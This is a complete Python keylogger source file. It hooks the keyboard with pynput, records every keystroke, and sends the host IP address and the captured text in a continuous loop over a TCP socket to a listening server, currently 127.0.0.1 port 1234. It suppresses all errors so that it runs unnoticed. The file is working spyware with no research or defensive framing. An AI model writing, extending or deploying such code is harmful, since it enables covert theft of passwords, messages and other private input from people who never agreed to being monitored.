import socket
import threading
import platform
from pynput.keyboard import Key, Listener

# Global variables
keystrokes = ""
hostname = platform.node()
ip_address = socket.gethostbyname(socket.gethostname())
keystrokes_lock = threading.Lock()

def on_key_press(key):
    global keystrokes
    try:
        with keystrokes_lock:
            if key == Key.space:
                keystrokes += " "
            elif key == Key.tab:
                if keystrokes:
                    keystrokes += "\t"
            elif key == Key.enter:
                keystrokes += "\n"
            elif hasattr(key, 'char') and key.char is not None:
                keystrokes += key.char
            else:
                keystrokes += " (sp) "
    except Exception:
        pass  # Silently handle any exceptions without printing

def send_ip_address_and_keystrokes_to_server():
    global keystrokes, ip_address
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect(("127.0.0.1", 1234))  # Connect to server

    try:
        # Send client's IP address as the first transmission
        ip_address_bytes = ip_address.encode('utf-8')
        server_socket.send(ip_address_bytes)

        while True:
            with keystrokes_lock:
                if keystrokes:
                    keystrokes_bytes = keystrokes.encode('utf-8')
                    server_socket.send(keystrokes_bytes)
                    keystrokes = ""  # Clear keystrokes after sending
    except Exception:
        pass  # Silently handle any exceptions without printing
    finally:
        server_socket.close()

# Start thread for sending IP address and keystrokes to server
send_thread = threading.Thread(target=send_ip_address_and_keystrokes_to_server)
send_thread.start()

# Listener for capturing keystrokes locally
with Listener(on_press=on_key_press) as listener:
    listener.join()  # Wait for the listener thread to terminate (which should never happen)
